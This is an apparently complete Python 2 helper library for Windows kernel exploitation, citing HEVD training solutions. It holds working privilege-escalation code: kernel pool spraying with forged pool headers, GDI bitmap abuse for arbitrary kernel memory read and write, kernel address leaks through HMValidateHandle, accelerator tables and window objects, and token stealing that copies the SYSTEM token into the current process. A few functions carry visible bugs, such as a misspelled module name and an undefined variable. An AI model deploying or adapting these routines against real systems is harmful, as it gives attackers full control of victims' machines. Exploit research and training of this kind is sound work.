import sys
import os
import struct
import platform
from ctypes import *
import sys, platform
from ctypes.wintypes import *

#########################################################################################
######################################Common structs#####################################
#########################################################################################

ULONG_PTR = PVOID = LPVOID = PVOID64 = c_void_p
PROCESSINFOCLASS = DWORD
ULONG = c_uint32
PULONG = POINTER(ULONG)
NTSTATUS = DWORD

#to be filled properly
class PEB(Structure):
	_fields_ = [
		("Stuff", c_byte * 0xF8),
		("GdiSharedHandleTable", PVOID)
	]

#source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684280(v=vs.85).aspx
class PROCESS_BASIC_INFORMATION(Structure):
	_fields_ = [
		("Reserved1", PVOID),
		("PebBaseAddress", POINTER(PEB)),
		("Reserved2", PVOID * 2),
		("UniqueProcessId", ULONG_PTR),
		("Reserved3", PVOID)
	]

#source: https://www.ekoparty.org/archivo/2015/eko11-Abusing_GDI.pdf
class GDICELL64(Structure):
	_fields_ = [
		("pKernelAddress", PVOID64),
		("wProcessId", USHORT), 
		("wCount", USHORT),
		("wUpper", USHORT),
		("wType", USHORT),
		("pUserAddress", PVOID64)
	]

#source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646340(v=vs.85).aspx
class ACCEL(Structure):
	_fields_ = [
		("fVirt", BYTE),
		("key", WORD), 
		("cmd", WORD)
	]

class ACCEL_ARRAY(Structure):
	_fields_ = [
		("ACCEL_ARRAY", POINTER(ACCEL) * 675)
	]
	
WNDPROCTYPE = WINFUNCTYPE(c_int, HWND, c_uint, WPARAM, LPARAM)
#WNDPROC  = WINFUNCTYPE(LPVOID, HWND, UINT, WPARAM, LPARAM)

#Windows 10x64 v1703
class WNDCLASSEX(Structure):
	_fields_ = [
		("cbSize", c_uint),
		("style", c_uint),
		("lpfnWndProc", WNDPROCTYPE),
		("cbClsExtra", c_int),
		("cbWndExtra", c_int),
		("hInstance", HANDLE),
		("hIcon", HANDLE),
		("hCursor", HANDLE),
		("hBrush", HANDLE),
		("lpszMenuName", LPCWSTR),
		("lpszClassName", LPCWSTR),
		("hIconSm", HANDLE)
	]
 
#########################################################################################
###################################Function definitions##################################
#########################################################################################

Psapi	= windll.Psapi
kernel32 = windll.kernel32
ntdll = windll.ntdll
gdi32 = windll.gdi32
shell32 = windll.shell32
user32 = windll.user32

ntdll.NtQueryInformationProcess.argtypes = [HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG]
ntdll.NtQueryInformationProcess.restype = NTSTATUS

gdi32.SetBitmapBits.argtypes = [HBITMAP, DWORD, LPVOID]
gdi32.SetBitmapBits.restype = LONG

gdi32.GetBitmapBits.argtypes = [HBITMAP, LONG, LPVOID]
gdi32.GetBitmapBits.restype = LONG

gdi32.CreateBitmap.argtypes = [c_int, c_int, UINT, UINT, c_void_p]
gdi32.CreateBitmap.restype = HBITMAP

kernel32.GetProcAddress.restype = c_ulonglong
kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]

#########################################################################################
######################################Common constants###################################
#########################################################################################

ProcessBasicInformation = 0 #Retrieves a pointer to a PEB structure that can be used to determine whether the specified process is being debugged, and a unique value used by the system to identify the specified process. It is best to use the CheckRemoteDebuggerPresent and GetProcessId functions to obtain this information.
ProcessDebugPort = 7 #Retrieves a DWORD_PTR value that is the port number of the debugger for the process. A nonzero value indicates that the process is being run under the control of a ring 3 debugger. It is best to use the CheckRemoteDebuggerPresent or IsDebuggerPresent function.
ProcessWow64Information = 26 #Determines whether the process is running in the WOW64 environment (WOW64 is the x86 emulator that allows Win32-based applications to run on 64-bit Windows). It is best to use the IsWow64Process function to obtain this information.
ProcessImageFileName = 27 # Retrieves a UNICODE_STRING value containing the name of the image file for the process. It is best to use the QueryFullProcessImageName or GetProcessImageFileName function to obtain this information.
ProcessBreakOnTermination = 29 #Retrieves a ULONG value indicating whether the process is considered critical. Note  This value can be used starting in Windows XP with SP3. Starting in Windows 8.1, IsProcessCritical should be used instead.
ProcessSubsystemInformation = 75#Retrieves a SUBSYSTEM_INFORMATION_TYPE value indicating the subsystem type of the process. The buffer pointed to by the ProcessInformation parameter should be large enough to hold a single SUBSYSTEM_INFORMATION_TYPE enumeration.

VER_NT_WORKSTATION 			= 1 # The system is a workstation.
VER_NT_DOMAIN_CONTROLLER	= 2	# The system is a domain controller.
VER_NT_SERVER				= 3	# The system is a server, but not a domain controller.

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

FILE_DEVICE_UNKNOWN = 0x00000022

METHOD_BUFFERED		= 0x0
METHOD_IN_DIRECT	= 0x1
METHOD_OUT_DIRECT	= 0x2
METHOD_NEITHER		= 0x3

FILE_READ_DATA		= 0x1
FILE_WRITE_DATA 	= 0x2
FILE_ANY_ACCESS		= 0x0

FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0x0

INVALID_HANDLE_VALUE = -1

#########################################################################################
###############This section contains kernel pool spraying related functions##############
#########################################################################################


kernel_object_sizes = {}

#sizes of various kernel objects
kernel_object_sizes['unnamed_mutex'] = 0x50
kernel_object_sizes['unnamed_job'] = 0x168
kernel_object_sizes['iocompletionreserve'] = 0x60
kernel_object_sizes['unnamed_semaphore'] = 0x48
kernel_object_sizes['event'] = 0x40

pool_object_handles = []

#the first 0x28 bytes in the pool allocation, which will allow an overwrite
#the previous size and and the TypeIndex is set zero
pool_object_headers = {}
pool_object_headers['unnamed_mutex'] = [0x040a0000,0xe174754d,0x00000000,0x00000050,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_job'] = [0x042d0000,0xa0626f4a,0x00000000,0x00000168,0x0000006c,0x86e0bd80,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['iocompletionreserve'] = [0x040c0000,0xef436f49,0x00000000,0x0000005c,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_semaphore'] = [0x04090000,0xe16d6553,0x00000000,0x00000044,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['event'] = [0x04080000,0xee657645,0x00000000,0x00000040,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]

"""
#The original typeindex (in case I need it later)
original_typeindex = {}
original_typeindex['unnamed_mutex'] = 0xe
original_typeindex['unnamed_job'] = 0x6
original_typeindex['iocompletionreserve'] = 0xa
original_typeindex['unnamed_semaphore'] = 0x10
original_typeindex['event'] = 0xc
"""

SPRAY_COUNT = 50000

def allocate_object(object_to_use, variance):
	"""
	Allocate an object based on the input
	@param object_to_use: name of the object to allocate
	@param variance: extra string to use (typically a number) for named objects
	@return: the handle to the object
	"""
	hHandle = HANDLE(0)
	if object_to_use == 'unnamed_mutex':
		hHandle = kernel32.CreateMutexA(None, False, None)
	elif object_to_use == 'named_mutex':
		hHandle = kernel32.CreateMutexA(None, False, "Pool spraying is cool %s" % variance)
	elif object_to_use == 'unnamed_job':
		hHandle = kernel32.CreateJobObjectA(None, None)
	elif object_to_use == 'named_job':
		hHandle = kernel32.CreateJobObjectA(None, "Job %s" % variance)
	elif object_to_use == 'iocompletionport':
		hHandle = kernel32.CreateIoCompletionPort(-1, None, 0, 0)
	elif object_to_use == 'iocompletionreserve':
		IO_COMPLETION_OBJECT = 1
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
		hHandle = hHandle.value
	elif object_to_use == 'unnamed_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, None)
	elif object_to_use == 'named_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, "My little Semaphore %s" % variance)
	elif object_to_use == 'event':
		hHandle = kernel32.CreateEventA(None, False, False, None)
	if hHandle == None:
		print "[-] Error while creating object: %s" % object_to_use
		sys.exit(-1)
	return hHandle

def find_object_to_spray(required_hole_size):
	"""
	Calculates which object to use for kernel pool spraying
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@return: the object to use for creating the hole size
	"""
	for key in kernel_object_sizes:
		if required_hole_size % kernel_object_sizes[key] == 0:
			print "[+] Found a good object to spray with: %s" % key
			return key
	print "[-] Couldn't find proper object to spray with"
	sys.exit()

def spray(required_hole_size):
	"""
	Spray the heap with objects which will allow us to create the required holes later
	@param required_hole_size: : the required hole size in kernel pool, which will be overflown
	@return: object type (name) to use for overflow
	"""
	global pool_object_handles
	good_object = find_object_to_spray(required_hole_size)
	for i in range(SPRAY_COUNT):
		pool_object_handles.append(allocate_object(good_object, i))
	print "[+] Spray done!"
	return good_object

def make_hole(required_hole_size, good_object):
	"""
	Making holes in the sprayd kernel
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@param good_object: object type (name) to use for overflow
	"""
	global pool_object_handles
	nr_to_free = required_hole_size / kernel_object_sizes[good_object]
	for i in range(0, SPRAY_COUNT,16):
		for j in range(0,nr_to_free):
			kernel32.CloseHandle(pool_object_handles[i + j])
			pool_object_handles[i + j] = None
	print "[+] Making holes done!"

def gimme_the_hole(required_hole_size):
	"""
	Spray and make holes
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	"""
	good_object = spray(required_hole_size)
	make_hole(required_hole_size, good_object)
	return good_object

def close_all_handles():
	"""
	Close all handles, which were used for kernel pool spraying
	"""
	print "[+] Triggering shellcode!"
	global pool_object_handles
	for i in range(0, SPRAY_COUNT):
		if (pool_object_handles[i] != None):
			kernel32.CloseHandle(pool_object_handles[i])
			pool_object_handles[i] = None
	print "[+] Free pool allocations done!"

def calculate_previous_size(required_hole_size):
	"""
	Calculate the previous size value for the pool header
	The PreviousSize value * 8 = previous chunk
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@return: the previous_size value to be used on the POOL_HEADER
	"""
	if platform.architecture()[0] == '64bit':
		return required_hole_size/16
	elif platform.architecture()[0] == '32bit':
		return required_hole_size/8
	else:
		print "[-] Couldn't determine the Windows architecture, exiting..."
		sys.exit(-1)

def pool_overwrite(required_hole_size,good_object):
	"""
	This function will give us the data (POOL_HEADER + part of OBJECT_HEADER) to be used for the pool overwrite
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@param good_object: object type (name) to use for overflow
	"""
	header = ''
	for i in range(len(pool_object_headers[good_object])):
		if i == 0:
			#for the first entry we need to calculate the previous pool size value, as it's required
			header += struct.pack("L",pool_object_headers[good_object][0] + calculate_previous_size(required_hole_size))
		else:
			header += struct.pack("L",pool_object_headers[good_object][i])
	return header

#########################################################################################
############This section contains kernel GDI object abusing related functions############
#########################################################################################


def create_bitmap(width, height, cBitsPerPel):
	"""
	This function will create a bitmap for write-what-where vulnerabilities with GDI abuse
	@param width: width of the bitmap
	@param height: height of the bitmap
	@param cBitsPerPel: bit ber cel 
	@return: the handle to the BITMAP object
	"""
	bitmap_handle = HBITMAP()

	bitmap_handle = gdi32.CreateBitmap(width, height, 1, cBitsPerPel, None)
	if bitmap_handle == None:
		print "[-] Error creating bitmap, exiting...."
		sys.exit(-1)
	print "[+] Bitmap handle: %s" % hex(bitmap_handle)
	return bitmap_handle

def create_bitmaps(width, height, cBitsPerPel):
	"""
	This function will create the worker and manager bitmap for write-what-where vulnerabilities with GDI abuse
	@param width: width of the bitmap
	@param height: height of the bitmap
	@param cBitsPerPel: bit ber cel 
	"""
	print "[*] Creating manager bitmap"
	manager_bitmap_handle = create_bitmap(width, height, cBitsPerPel)
	print "[*] Creating worker bitmap"
	worker_bitmap_handle = create_bitmap(width, height, cBitsPerPel)
	return (manager_bitmap_handle, worker_bitmap_handle)

def calculate_bitmap_size_parameters(s):
	"""
	This function will calculate the parameters to be used for bitmap allocation, if we know what is the size we need to allocate, height=1, cBitsPerPel=8
	@param s: size of the bitmap we need
	@return: (width, height, cBitsPerPel) tuple
	"""
	p = platfrom.platform()
	if p == 'Windows-10-10.0.10586':
		bmp_offset = 0x258
		min_size = 0x370
	elif p == 'Windows-10-10.0.14393':
		bmp_offset = 0x260
		min_size = 0x370
	elif p == 'Windows-10-10.0.15063':
		bmp_offset = 0x260
		min_size = 0x370
	elif p == 'Windows-8-6.2.9200-SP0':
		bmp_offset = 0x250
		min_size = 0x360
	elif p == 'Windows-8.1-6.3.9600':
		bmp_offset = 0x258
		min_size = 0x370
	elif p == 'Windows-7-6.1.7601-SP1':
		bmp_offset = 0x238
		min_size = 0x350
	
	if s < min_size:
		print "[-] Too small size, such Bitmap can't be allocated..."
		sys.exit(-1)
	elif s < 0x1000:
		print "[+] Bitmap will be allocated in the Paged session pool"
		width = s - bmp_offset - 0x10
	else:
		print "[+] Bitmap will be allocated in the Paged session pool / large pool"
		width = s - bmp_offset
	return (width, 1, 8)

def get_gdisharedhandletable():
	"""
	This function will return the GdiSharedHandleTable address of the current process
	"""
	process_basic_information = PROCESS_BASIC_INFORMATION()
	ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), ProcessBasicInformation, byref(process_basic_information), sizeof(process_basic_information), None)
	peb =  process_basic_information.PebBaseAddress.contents
	return peb.GdiSharedHandleTable

def get_pvscan0_address(bitmap_handle):
	"""
	Get the pvScan0 address, works up to Windows 10 v1511
	@param bitmap_handle: handle to the bitmap
	@return: the PVSCAN0 address in the kernel
	"""
	gdicell64_address = get_gdisharedhandletable() + (bitmap_handle & 0xFFFF) * sizeof(GDICELL64()) #the address is in user space
	gdicell64 = cast(gdicell64_address,POINTER(GDICELL64))
	pvscan0_address = gdicell64.contents.pKernelAddress + 0x50 #0x18 to SurfObj SURFOBJ64 -> 0x38 into SURFOBJ64 pvScan0 ULONG64
	return pvscan0_address

def set_address(manager_bitmap, address):
	"""
	Sets the pvscan0 of the worker to the address we want to read/write later through the manager_bitmap
	@param manager_bitmap: handle to the manager bitmap
	@param address: the address to be set in worker bitmap's pvscan0 pointer
	"""
	address = c_ulonglong(address)
	gdi32.SetBitmapBits(manager_bitmap, sizeof(address), addressof(address));
	
def write_memory(manager_bitmap, worker_bitmap, dst, src, len):
	"""
	Writes len number of bytes to the destination memory address from the source memory
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param dst: destination to write to
	@param src: the source to copy from
	@param len: the amount to write
	"""
	set_address(manager_bitmap, dst)
	gdi32.SetBitmapBits(worker_bitmap, len, src)
	
def read_memory(manager_bitmap, worker_bitmap, src, dst, len):
	"""
	Reads len number of bytes to the destination memory address from the source memory
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param dst: destination to copy to
	@param src: the source to read from
	@param len: the amount to read
	"""
	set_address(manager_bitmap, src)
	gdi32.GetBitmapBits(worker_bitmap, len, dst)

#original source: https://github.com/GradiusX/HEVD-Python-Solutions
def get_current_eprocess(manager_bitmap, worker_bitmap, pointer_EPROCESS):
	"""
	This function gets the kernel address of the current EPROCESS structure. It does it by going through the EPROCESS linked list.
	We need the bitmaps in order to read from memory.
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap
	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with (typically SYSTEM)
	@return: pointer to the current EPROCESS structure
	"""
	if platform.architecture()[0] == '64bit':
		#get OS EPROCESS structure constans values
		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = setosvariablesx64()
		flink = c_ulonglong()
		read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
		current_pointer_EPROCESS = 0
		while (1):
			unique_process_id = c_ulonglong(0)
			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
			# Get PID; 
			read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
			# Check if we're in the current process
			if (os.getpid() == unique_process_id.value):
				current_pointer_EPROCESS = pointer_EPROCESS
				break
			read_memory(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
			# If next same as last, we've reached the end
			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
				break		
		return current_pointer_EPROCESS
	else:
		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
		sys.exit(-1)

def tokenstealing_with_bitmaps(manager_bitmap, worker_bitmap):
	"""
	This function perform tokenstealing with the help of bitmaps
	@param manager_bitmap: handle to the manager bitmap
	@param worker_bitmap: handle to the worker bitmap	
	"""
	if platform.architecture()[0] == '64bit':
		# Get SYSTEM EPROCESS
		PsInitialSystemProcess = get_psinitialsystemprocess()
		system_EPROCESS = c_ulonglong()
		read_memory(manager_bitmap, worker_bitmap, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
		system_EPROCESS = system_EPROCESS.value	
		print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
	
		# Get current EPROCESS
		current_EPROCESS = get_current_eprocess(manager_bitmap, worker_bitmap, system_EPROCESS)
		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)

		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = setosvariablesx64()
		system_token = c_ulonglong()
		print "[+] Reading System TOKEN"
		read_memory(manager_bitmap, worker_bitmap, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
		print "[+] Writing System TOKEN"
		write_memory(manager_bitmap, worker_bitmap, current_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
	else:
		print "[-]Token stealing with bitmaps function is not prepared to work on x86, exiting..."
		sys.exit(-1)
	
def get_accel_kernel_address(handle):
	"""
	Returns kernel pointer of Accelerator Table given a Handle to it
	@param handle: handle
	@return: kernel pointer of Accelerator Table
	"""
	if platform.architecture()[0] == '64bit':
		gSharedInfo_address = kernel32.GetProcAddress(user32._handle,"gSharedInfo")
		handle_entry = cast (gSharedInfo_address + 0x8, POINTER(c_void_p))
		pHead_ptr_ptr = handle_entry.contents.value + (handle & 0xFFFF) * 0x18
		pHead_ptr = cast(pHead_ptr_ptr, POINTER(c_void_p))
	else:
		gSharedInfo_address = kernel32.GetProcAddress(user32._handle,"gSharedInfo")
		handle_entry = cast (gSharedInfo_address + 0x8, POINTER(c_void_p))
		pHead_ptr_ptr = handle_entry.contents.value + (handle & 0xFFFF) * 0xc
		pHead_ptr = cast(pHead_ptr_ptr, POINTER(c_void_p))
	return pHead_ptr.contents.value

def alloc_free_accelerator_tables():
	"""
	Allocates and Frees Accelerator Tables until last 2 addresses match
	@return kernel pointer to the accelarator table
	"""
	previous_kernel_address = 0
	while (1):
		accel_array = ACCEL_ARRAY()
		hAccel = user32.CreateAcceleratorTableA(addressof(accel_array), 675) # size = 0x1000
		kernel_address = get_accel_kernel_address(hAccel)
		user32.DestroyAcceleratorTable(hAccel)
		if previous_entry == kernel_address:
			print "[+] Duplicate AcceleratorTable: 0x%X" % kernel_address
			return kernel_address
		previous_kernel_address = kernel_address

#https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
def findHMValidateHandle():
	"""
	Searches for HMValidateHandle() function
	@return: pHMValidateHandle
	"""
	print "[*] Locating HMValidateHandle offset"	
	kernel32.LoadLibraryA.restype = HMODULE
	hUser32 = kernel32.LoadLibraryA("user32.dll")
	pIsMenu = kernel32.GetProcAddress(hUser32, "IsMenu")
	if pIsMenu == None:
		print "\t[-] Failed to find location of exported function 'IsMenu' within user32.dll..."
		sys.exit(-1)
	print "\t[+] user32.IsMenu: 0x%X" % pIsMenu
	pHMValidateHandle_offset = 0
	offset = 0
	while (offset < 0x1000):
		tempByte = cast(pIsMenu + offset, POINTER(c_ubyte))
		# if byte == 0xE8
		if tempByte.contents.value == 0xE8:
			pHMValidateHandle_offset = pIsMenu + offset + 1
			break
		offset = offset + 1
	if pHMValidateHandle_offset == 0:
		print "\t[-] Failed to find offset of HMValidateHandle from location of 'IsMenu'..."
		sys.exit(-1)
	print "\t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset
	HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
	print "\t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset
	#Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
	#The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
	print "\t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle
	return pHMValidateHandle

def PyWndProcedure(hWnd, Msg, wParam, lParam):
	""" Callback Function for CreateWindow() """
	# if Msg == WM_DESTROY
	if Msg == 2:
		user32.PostQuitMessage(0)
	else:
		return user32.DefWindowProcW(hWnd, Msg, wParam, lParam)
	return 0

#source: https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1703/HEVD_arbitraryoverwrite.py
def allocate_free_window(classNumber, pHMValidateHandle):
	""" Allocate and Free a single Window """

	# Create prototype for HMValidateHandle()
	HMValidateHandleProto = WINFUNCTYPE (c_ulonglong, HWND, c_int)
	HMValidateHandle = HMValidateHandleProto(pHMValidateHandle)

	WndProc = WNDPROCTYPE(PyWndProcedure)
	hInst = kernel32.GetModuleHandleA(0)

	# instantiate WNDCLASSEX 
	wndClass = WNDCLASSEX()
	wndClass.cbSize = sizeof(WNDCLASSEX)
	wndClass.lpfnWndProc = WndProc
	wndClass.cbWndExtra = 0
	wndClass.hInstance = hInst
	wndClass.lpszMenuName = 'A' * 0x8f0 
	wndClass.lpszClassName = "Class_" + str(classNumber)

	# Register Class and Create Window
	hCls = user32.RegisterClassExW(byref(wndClass))
	hWnd = user32.CreateWindowExA(0,"Class_" + str(classNumber),'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)

	if platform.platform() == 'Windows-10-10.0.15063':	
		# Run HMValidateHandle on Window handle to get a copy of it in userland
		pWnd = HMValidateHandle(hWnd,1)
		# Read pSelf from copied Window
		kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
		# Calculate ulClientDelta (tagWND.pSelf - HMValidateHandle())
		# pSelf = ptr to object in Kernel Desktop Heap; pWnd = ptr to object in User Desktop Heap
		ulClientDelta = kernelpSelf - pWnd
		# Read tagCLS from copied Window
		kernelTagCLS = (cast(pWnd+0xa8, POINTER(c_ulonglong))).contents.value
		# Calculate user-land tagCLS location: tagCLS - ulClientDelta
		userTagCLS = kernelTagCLS - ulClientDelta
		# Calculate kernel-land tagCLS.lpszMenuName
		tagCLS_lpszMenuName = (cast (userTagCLS+0x90, POINTER(c_ulonglong))).contents.value
	else:
		pWnd = HMValidateHandle(hWnd,1)
		kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value
		ulClientDelta = kernelpSelf - pWnd
		kernelTagCLS = (cast(pWnd+0x98, POINTER(c_ulonglong))).contents.value
		userTagCLS = kernelTagCLS - ulClientDelta
		tagCLS_lpszMenuName = (cast (userTagCLS+0x88, POINTER(c_ulonglong))).contents.value
		
	# Destroy Window
	user32.DestroyWindow(hWnd)
	# Unregister Class
	user32.UnregisterClassW(c_wchar_p("Class_" + str(classNumber)), hInst)
		
	return tagCLS_lpszMenuName
		
#source: https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1703/HEVD_arbitraryoverwrite.py
def alloc_free_windows(classNumber):
	""" Calls alloc_free_window() until current address matches previous one """
	pHMValidateHandle = findHMValidateHandle()
	previous_entry = 0
	while (1):
		plpszMenuName = allocate_free_window(classNumber, pHMValidateHandle)
		if previous_entry == plpszMenuName:
			return plpszMenuName
		previous_entry = plpszMenuName
		classNumber = classNumber + 1 

def gdi_abuse_gdisharedhandletable_technique():
	"""
	Technique to be used on Win 10 v1511 or earlier. Locate the pvscan0 address with the help of gdiSharedHandleTable
	@return: pvscan0 address of the manager and worker bitmap and the handles
	"""
	(manager_bitmap_handle, worker_bitmap_handle) = create_bitmaps(0x64, 0x64, 32)
	worker_bitmap_pvscan0 = get_pvscan0_address(worker_bitmap_handle)
	manager_bitmap_pvscan0 = get_pvscan0_address(manager_bitmap_handle)
	return (manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle)

def gdi_abuse_accelerator_tables_technique():
	"""
	Technique to be used on Win 10 v1607 or earlier. Locate the pvscan0 address with the help of ACCEL user object
	@return: pvscan0 address of the manager and worker bitmap and the handles
	"""
	accelerator_address = alloc_free_accelerator_tables()
	manager_bitmap_handle = create_bitmap(0x100, 0x6D, 1)
	manager_bitmap_pvscan0 = accelerator_address + 0x50
	accelerator_address = alloc_free_accelerator_tables()
	worker_bitmap_handle = create_bitmap(0x100, 0x6D, 1)
	worker_bitmap_pvscan0 = accelerator_address + 0x50
	return (manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle)

def gdi_abuse_tagwnd_technique():
	"""
	Technique to be used on Win 10 v1703 or earlier. Locate the pvscan0 address with the help of tagWND structures
	@return: pvscan0 address of the manager and worker bitmap and the handles
	"""
	window_address = alloc_free_windows(0)
	manager_bitmap_handle = create_bitmap(0x100, 0x6D, 1)
	manager_bitmap_pvscan0 = window_address + 0x50
	window_address = alloc_free_windows(0)
	worker_bitmap_handle = create_bitmap(0x100, 0x6D, 1)
	worker_bitmap_pvscan0 = window_address + 0x50
	return (manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle)
	
def get_www_address_and_bitmaps():
	"""
	Get a What and Where addresses to be used with GDI abuse and the related handles, it should work independent the underlying OS
	@return: what, where addresses for WWW vulns and manager & worker bitmap handles
	"""
	p = platform.platform()
	if p == 'Windows-10-10.0.10586' or p == 'Windows-8-6.2.9200-SP0' or p == 'Windows-8.1-6.3.9600' or p == 'Windows-7-6.1.7601-SP1':
		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_gdisharedhandletable_technique()
	elif p == 'Windows-10-10.0.14393':
		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_accelerator_tables_technique()
	elif p == 'Windows-10-10.0.15063':
		(manager_bitmap_pvscan0, worker_bitmap_pvscan0, manager_bitmap_handle, worker_bitmap_handle) = gdi_abuse_tagwnd_technique()
	else:
		print "[-] No matching OS found to abuse GDI objects, exiting..."
		sys.exit(-1)
	print "[+] Manager Bitmap pvscan0 offset: %s" % hex(manager_bitmap_pvscan0)
	print "[+] Worker Bitmap pvscan0 address: %s" % hex(worker_bitmap_pvscan0)
	what = c_void_p(worker_bitmap_pvscan0)
	where = manager_bitmap_pvscan0
	return (what, where, manager_bitmap_handle, worker_bitmap_handle)


#########################################################################################
###################This section contains other general functions#########################
#########################################################################################

def ctl_code(function,
			 devicetype = FILE_DEVICE_UNKNOWN,
			 access = FILE_ANY_ACCESS,
			 method = METHOD_NEITHER):
	"""Recreate CTL_CODE macro to generate driver IOCTL"""
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)


#https://www.exploit-db.com/exploits/34272/
def getLastError():
	"""Format GetLastError"""
	buf = create_string_buffer(2048)
	if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
			kernel32.GetLastError(), NULL,
			buf, sizeof(buf), NULL):
		print "[-] " +  buf.value
	else:
		print "[-] Unknown Error"

#https://www.exploit-db.com/exploits/34272/
def alloc_memory(base_address, input, input_size):
	"""
	Allocate input buffer
	"""
	print "[*] Allocating input buffer"
	base_address_c   = c_int(base_address)
	input_size_c = c_int(input_size)
	ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
											  POINTER(c_int),
											  c_ulong,
											  POINTER(c_int),
											  c_int,
											  c_int]
	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF,
											 byref(base_address_c),
											 0x0, 
											 byref(input_size_c), 
											 MEM_RESERVE|MEM_COMMIT,
											 PAGE_EXECUTE_READWRITE)
	if dwStatus != STATUS_SUCCESS:
		print "[-] Error while allocating memory: %s" % dwStatus
		getLastError()
		sys.exit()
	written = c_ulong()
	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, base_address, input, len(input), byref(written))
	if alloc == 0:
		print "[-] Error while writing our input buffer memory: %s" % alloc
		getLastError()
		sys.exit()

#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
def find_driver_base(driver=None):
	if platform.architecture()[0] == '64bit':
		lpImageBase = (c_ulonglong * 1024)()
		lpcbNeeded = c_longlong()
		Psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	else:
		lpImageBase = (c_ulong * 1024)()
		lpcbNeeded = c_long()
	driver_name_size = c_long()
	driver_name_size.value = 48
	Psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
	for base_addr in lpImageBase:
		driver_name = c_char_p('\x00' * driver_name_size.value)
		if base_addr:
			Psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print "[+] Retrieving kernel info..."
				print "[+] Kernel version:", driver_name.value
				print "[+] Kernel base address: %s" % hex(base_addr)
				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print "[+] Retrieving %s info..." % driver_name
				print "[+] %s base address: %s" % (driver_name, hex(base_addr))
